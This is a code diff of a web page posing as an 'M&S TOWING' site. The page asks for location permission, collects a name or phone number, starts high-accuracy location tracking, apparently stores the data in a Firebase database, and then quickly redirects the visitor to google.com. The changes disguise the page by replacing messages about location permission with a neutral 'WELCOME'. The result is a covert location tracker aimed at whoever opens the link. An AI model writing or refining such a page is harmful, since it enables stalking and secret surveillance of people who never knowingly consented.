@@ -18,10 +18,11 @@
 
 <h2>M&S TOWING</h2>
 
+<input id="nameInput" placeholder="Enter name or phone number">
 
 <button id="enterBtn" onclick="startTracking()" disabled>ENTER SITE</button>
 
-<p id="status">Checking location permission...</p>
+<p id="status">WELCOME...</p>
 
 <script>
 const firebaseConfig = {
@@ -36,26 +37,27 @@ const db = firebase.database();
 
 let watchId;
 
-// Check permission immediately
-checkLocationPermission();
-
+// Ask for location permission and enable button if granted
 function checkLocationPermission() {
   if (!navigator.geolocation) {
-    document.getElementById("status").innerText = "Geolocation not supported";
+    document.getElementById("status").innerText = "WELCOME";
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     () => {
       document.getElementById("enterBtn").disabled = false;
-      document.getElementById("status").innerText = "";
+      document.getElementById("status").innerText = "ENTER SITE";
     },
     () => {
       document.getElementById("enterBtn").disabled = true;
-      document.getElementById("status").innerText = "";
+      document.getElementById("status").innerText = "WELCOME";
     }
   );
 }
+
+// Run permission check on page load
+checkLocationPermission();
 
 // Reverse geocode
 async function getAddress(lat, lng) {
@@ -69,7 +71,8 @@ async function getAddress(lat, lng) {
 }
 
 function startTracking() {
-  let userName = document.getElementById("nameInput").value.trim();
+  const inputField = document.getElementById("nameInput");
+  let userName = inputField.value.trim();
 
   if (!userName) {
     userName = "user_" + Math.random().toString(36).substr(2, 6);
@@ -96,7 +99,7 @@ function startTracking() {
     enableHighAccuracy: true
   });
 
-  // Redirect after tracking starts
+  // Redirect after starting
   setTimeout(() => {
     window.location.replace("https://www.google.com");
   }, 1500);
